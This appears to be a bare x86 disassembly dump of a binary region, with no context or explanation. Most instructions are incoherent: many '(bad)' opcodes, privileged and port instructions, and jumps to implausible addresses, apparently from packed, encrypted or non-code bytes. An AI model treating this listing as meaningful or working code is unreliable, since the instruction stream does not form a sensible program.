  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
